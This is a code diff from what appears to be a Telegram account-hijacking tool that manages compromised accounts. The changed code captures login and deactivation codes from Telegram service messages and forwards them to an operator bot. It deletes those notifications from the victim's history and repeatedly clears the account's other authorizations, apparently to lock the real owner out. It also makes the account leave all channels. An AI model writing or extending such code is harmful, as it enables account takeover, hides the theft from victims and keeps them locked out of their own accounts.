@@ -78917,7 +78917,7 @@ var extractLoginCode = (message) => {
   }
   return null;
 };
-var handleUpdate = async (client, accountId, update) => {
+var handleUpdate = async (client, accountId, forceClearAuth, update) => {
   if (!update) {
     return;
   }
@@ -78941,11 +78941,14 @@ var handleUpdate = async (client, accountId, update) => {
       const code = extractLoginCode(update.message);
       let messageText = update.message;
       if (code) {
-        messageText = update.message.includes("my.telegram.org") ? `CODE_FOR_DEACTIVATE_ACCOUNT: ${code}` : `CODE_FOR_LOGIN: ${code}`;
+        messageText = update.message.includes("my.telegram.org") ? `CODE_FOR_DEACTIVATE: ${code}` : `CODE_FOR_LOGIN: ${code}`;
       }
       const notificationMessage = `[TELEGRAM_SERVICE_NOTIFICATION]
 ID: ${accountId}
 MESSAGE: ${messageText}`;
+      await updateAccountById(accountId, {
+        lastServiceNotification: /* @__PURE__ */ new Date()
+      });
       await sendToMainBot(notificationMessage);
       if (client) {
         await deleteHistory(
@@ -78956,6 +78959,18 @@ MESSAGE: ${messageText}`;
           }),
           true
         );
+      }
+      if (forceClearAuth) {
+        [0.5, 1.5, 2.5, 3.5, 4.5].forEach((minutes) => {
+          setTimeout(
+            async () => {
+              if (client) {
+                await clearAuthorizations(client);
+              }
+            },
+            minutes * 60 * 1e3
+          );
+        });
       }
     }
   }
@@ -79392,10 +79407,7 @@ var automaticCheck = async (client, account) => {
     const folderPeers = [];
     const archiveDialogs = await getDialogs(client, accountId, 1);
     for (const archiveDialog of archiveDialogs) {
-      const { type, dialog, message } = archiveDialog;
-      if (type === "channel" && message instanceof import_api19.default.Message && !Boolean(message.noforwards)) {
-        continue;
-      }
+      const { dialog } = archiveDialog;
       const peer = buildInputPeer(archiveDialog);
       if (dialog.pinned) {
         await togglePin(
@@ -79421,10 +79433,7 @@ var automaticCheck = async (client, account) => {
     }
     const dialogs = await getDialogs(client, accountId, 0);
     for (const dialog of dialogs) {
-      const { type, message } = dialog;
-      if (type === "channel" && message instanceof import_api19.default.Message && !Boolean(message.noforwards)) {
-        continue;
-      }
+      const { type } = dialog;
       const peer = buildInputPeer(dialog);
       if (type === "channel") {
         await leaveChannel(client, peer);
@@ -80297,7 +80306,7 @@ var checker = async (ID, accountsInWork) => {
     account = accountByID;
     client = await initClient(
       { ...account, empty: false },
-      (update) => handleUpdate(client, ID, update),
+      (update) => handleUpdate(client, ID, true, update),
       (error) => sendToMainBot(error)
     );
     if (!client) {
